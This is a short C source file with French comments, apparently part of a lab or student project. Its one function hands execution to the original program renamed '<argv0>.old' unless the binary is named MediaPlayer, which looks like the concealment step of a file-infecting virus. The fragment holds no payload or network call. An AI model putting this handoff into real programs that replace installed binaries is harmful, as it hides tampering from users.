//
// Created by armotik on 24/03/25.
//

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "transfert.h"

void transferer_execution_si_necessaire(const char *argv0, char **argv) {
    // Si l'exécutable s'appelle MediaPlayer, on ne transfère pas l'exécution
    if (strstr(argv0, "MediaPlayer") != NULL) {
        return;
    }

    // Sinon on transfère vers <argv0>.old
    char chemin_old[MAX_PATH_LEN];
    snprintf(chemin_old, sizeof(chemin_old), "%s.old", argv0);

    printf("[*] Transfert d'exécution vers le programme original : %s\n", chemin_old);
    execv(chemin_old, argv);

    // Si on revient ici, execv a échoué
    perror("Erreur execv");
    exit(EXIT_FAILURE);
}
